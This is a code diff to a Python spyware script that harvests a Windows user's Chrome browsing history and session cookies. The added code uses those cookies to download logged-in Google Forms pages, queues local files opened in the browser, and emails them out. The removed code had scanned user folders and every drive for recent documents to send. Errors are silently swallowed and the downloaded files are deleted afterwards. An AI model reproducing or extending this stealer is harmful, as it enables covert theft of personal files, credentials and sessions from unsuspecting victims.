@@ -1,16 +1,22 @@
-import mimetypes
-import time
-import smtplib
-from email.message import EmailMessage
-import csv
 import os
+import csv
 import browserhistory as bh
+import urllib.request
+import browser_cookie3 # pip install browser_cookie3
 
-# The mail addresses and password
-
-SENDER = ""  # Syntax: <Example.email1@gmail.com>
-SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
-RECEIVER = ""  # Syntax: <Example.email2@gmail.com>
+def download_form(url, i):
+    try:
+        global form_list
+        cj = browser_cookie3.chrome()
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+        login_html = opener.open(url).read()
+        # make a html file and store login_html in it
+        with open(f"C:\\temp\\login{i}.html", "wb") as f:
+            f.write(login_html)
+        # put it on form_list
+        form_list.append(f"C:\\temp\\login{i}.html")
+    except Exception:  # NOQA
+        pass
 
 def get_chrome_history():
     # close chrome if it is open
@@ -27,6 +33,20 @@ def get_chrome_history():
     
     i = 0
     while True:
+        try:
+            # if it's Google form
+            if dict_obj['chrome'][i][0].startswith("https://docs.google.com/forms/"):
+                download_form(dict_obj['chrome'][i][0], i)
+                i += 1
+            # if it's a path
+            elif dict_obj['chrome'][i][0].startswith("file:///"):
+                # remove the file:///
+                path = dict_obj['chrome'][i][0][8:]
+                priority_files.append(path)
+                i += 1
+        except Exception:  # NOQA
+            pass
+
         try:
             if not os.path.exists("C:\\temp") or not os.path.isfile("C:\\temp\\.tempcache.csv"):
                 try:
@@ -45,48 +65,14 @@ def get_chrome_history():
                                                      quoting=csv.QUOTE_MINIMAL)
                 decrypt_password_writer.writerow(dict_obj['chrome'][i])
             i += 1
-        except Exception:  # NOQA (This will go hit a list out of index error, that's normal)
+        except Exception as e:  # NOQA
+            print(e)
             break
 
-def clairvoyance():
-    """
-    Get all the name of the files in the pc
-    """
-    # Get the current pc username
-    user = os.getlogin()
-    file_set = set()
-    # Requirements for files
-    DETECT_TUPLE = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Desktop", f"C:\\Users\\{user}\\Documents",
-                    f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
-                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
-    EXTENSION = (".docx", ".pdf")  # Detect the extension name
-    DETECT_KEYWORD = ("", )  # detect any keywords within the file, make it lowercase.
-    days = 20  # How many days since last modified back to search
+def delete_form(form_lst):
+    for i in form_lst:
+        os.remove(i)
 
-    # Add the rest of the drives to the tuple
-    drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
-    drives.remove("C:")
-    # add \\
-    drives = [x + "\\" for x in drives]
-    DETECT_TUPLE += tuple(drives)
-
-    # Get all the files in the pc
-    for path in DETECT_TUPLE:
-        for root, dirs, files in os.walk(path):
-            for file in files:
-                if file.endswith(EXTENSION) and (not file.startswith("~$")) and \
-                        (any(x in file.lower() for x in DETECT_KEYWORD)):
-                    try:
-                        # get the last modified time of the file
-                        last_modified = os.path.getmtime(os.path.join(root, file))
-                        if time.time() - last_modified < days * 24 * 60 * 60:  # check if it's in the last x days
-                            file_set.add(os.path.join(root, file))  # add it to the set
-                            # Limit the number of files to 99
-                            if file_set.__len__() >= 99:
-                                break
-                    except Exception:  # NOQA
-                        pass
-    return file_set
 
 def send_priority(subject, filename):
     msg = EmailMessage()
@@ -164,22 +150,11 @@ def access_and_send(*args):
                 smtp.quit()
             counter = 0
 
-# Do not do __main__
-priority_files = []
 try:
-    get_chrome_history()
+    access_and_send(form_list)
 except Exception:  # NOQA
     pass
 try:
-    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
-except Exception:  # NOQA
-    time.sleep(20)
-    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
-try:
-    access_and_send(priority_files)
-except Exception:  # NOQA
-    pass
-try:
-    access_and_send(clairvoyance())
+    delete_form(form_list)
 except Exception:  # NOQA
     pass
